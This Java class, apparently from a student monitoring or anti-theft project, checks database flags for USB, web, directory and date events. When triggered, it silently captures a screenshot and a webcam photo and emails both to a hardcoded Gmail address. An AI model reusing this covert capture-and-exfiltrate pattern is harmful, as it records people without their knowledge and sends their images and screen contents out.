package com;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

import javax.imageio.ImageIO;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import com.github.sarxos.webcam.Webcam;
import com.sun.org.apache.bcel.internal.generic.PUTSTATIC;
import com.util.SendAttachmentInEmail;

import jdk.nashorn.internal.ir.RuntimeNode.Request;

public class SendData{  
 
	public  void send(String msg) 
	{
		 	
		  try{ 
			  
			  String username,usb = null,web = null,directory = null,date = null;
			    
			   Connection con=DbConnection.getConnection();
			   PreparedStatement ps=con.prepareStatement("select * from tempp");
			 ResultSet rs=ps.executeQuery();
			 while(rs.next())
			 {
				 
				     usb=rs.getString("usb");
				 	 web=rs.getString("web");
				 	 directory=rs.getString("directory");
				 	 date=rs.getString("date");
				 	 username=rs.getString("username");
			 }
			 
			 //---------------------------------------------------------------
			    if(msg.equals("usb"))
			   {
				  if(usb.equals("no")){
					  capture();
				  }
			   }else if(msg.equals("date"))
			   {
				  if(date.equals("no"))
				  {
					  capture();
				  }
			   }else if(msg.equals("web"))
			   {
				  if(web.equals("no"))
				  {
					  capture();
				  }
			   }else if(msg.equals("directory"))
			   {
				  if(directory.equals("no"))
				  {
					  System.out.println("Captured");
					  capture();
				  }
			   }
			   
			   
			 
			} catch (Exception e) {
				e.printStackTrace();
			}
		//-------------------------------------------------------------------
		    
		//System.out.println("Done");
		 
		 
		
	}
	public void capture()
	{
		try {
			   
   		 BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
       	 ImageIO.write(image, "png", new File("H://screenshot.png"));
       	 Webcam webcam = Webcam.getDefault();
   		 webcam.open();
   	     ImageIO.write(webcam.getImage(), "PNG", new File("H:\\WebTest.png"));
   	     
   	      Thread.sleep(5000);
   	     SendAttachmentInEmail s = new SendAttachmentInEmail();//D:\\WebTest.png
            s.EmailSending("surajraje97@gmail.com", "Test", "Test", "H:\\screenshot.png","H:\\WebTest.png");
   		 
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	

}
